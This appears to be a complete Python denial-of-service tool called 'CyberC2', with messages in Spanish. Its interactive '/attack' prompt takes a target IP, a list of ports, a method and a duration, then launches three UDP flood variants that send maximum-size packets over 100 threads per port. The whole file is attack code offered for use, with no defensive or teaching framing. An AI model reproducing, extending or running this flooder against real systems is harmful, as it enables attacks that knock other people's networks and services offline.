import socket
import threading
import time
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

def print_banner():
    banner = f"""{Fore.RED}
  ******           **                       ******   **** 
  **////**  **   **/**                      **////** */// *
 **    //  //** ** /**       *****  ****** **    // /    /*
/**         //***  /******  **///**//**//*/**          *** 
/**          /**   /**///**/******* /** / /**         *//  
//**    **   **    /**  /**/**////  /**   //**    ** *     
 //******   **     /****** //******/***    //****** /******
  //////   //      /////    ////// ///      //////  //////   
"""
    print(banner)

def print_cyberc2():
    cyberc2_text = f"{Fore.CYAN}{Style.BRIGHT}CyberC2{Style.RESET_ALL}"
    print("\n" + cyberc2_text.center(80))

def udp_flood(target_ip, target_port, packet_size, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'\x00' * packet_size, (target_ip, target_port))
            print_cyberc2()
            print(f"{Fore.CYAN}Enviado paquete UDP Flood a {target_ip}:{target_port}")

def udpbypass(target_ip, target_port, packet_size, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'\x01' * packet_size, (target_ip, target_port))
            print_cyberc2()
            print(f"{Fore.CYAN}Enviado paquete UDPBypass a {target_ip}:{target_port}")

def udphex(target_ip, target_port, packet_size, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'\x02' * packet_size, (target_ip, target_port))
            print_cyberc2()
            print(f"{Fore.CYAN}Enviado paquete UDPHex a {target_ip}:{target_port}")

def start_attack_multiple_ports(method, target_ip, target_ports, packet_size, duration, num_threads):
    threads = []
    for port in target_ports:
        for _ in range(num_threads):
            if method == 'udp_flood':
                thread = threading.Thread(target=udp_flood, args=(target_ip, port, packet_size, duration))
            elif method == 'udpbypass':
                thread = threading.Thread(target=udpbypass, args=(target_ip, port, packet_size, duration))
            elif method == 'udphex':
                thread = threading.Thread(target=udphex, args=(target_ip, port, packet_size, duration))
            else:
                print("Método de ataque no reconocido.")
                return
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    print_banner()  # Display the banner

    while True:
        # Interactive panel: wait for the user to input a command
        user_input = input(f"{Fore.GREEN}CyberC2 • >> ").strip()

        # If the user types /attack, start the attack
        if user_input.lower().startswith('/attack'):
            try:
                # Parse the /attack command
                parts = user_input.split()
                if len(parts) != 5:
                    print(f"{Fore.RED}Uso incorrecto. El formato es: /attack {Fore.YELLOW}{'<ip>'} {Fore.YELLOW}{'<port>'} {Fore.YELLOW}{'<method>'} {Fore.YELLOW}{'<time>'}")
                    continue

                _, target_ip, target_ports, method, duration = parts
                target_ports = [int(p) for p in target_ports.split(',')]  # Multiple ports, split by comma
                duration = int(duration)
                packet_size = 65507  # Fixed packet size as requested
                num_threads = 100  # Number of threads fixed as requested

                methods = method.split(',')

                for attack_method in methods:
                    attack_method = attack_method.strip()
                    start_attack_multiple_ports(attack_method, target_ip, target_ports, packet_size, duration, num_threads)

            except ValueError:
                print(f"{Fore.RED}Error en los parámetros. Asegúrese de que {Fore.YELLOW}IP{Fore.RED}, {Fore.YELLOW}Puerto{Fore.RED}, {Fore.YELLOW}Método{Fore.RED} y {Fore.YELLOW}Duración{Fore.RED} sean correctos.")
                continue
        else:
            print(f"{Fore.RED}Comando no reconocido. Usa '/attack {Fore.YELLOW}<ip> <port> <method> <time>' para ejecutar un ataque.")

if __name__ == "__main__":
    main()
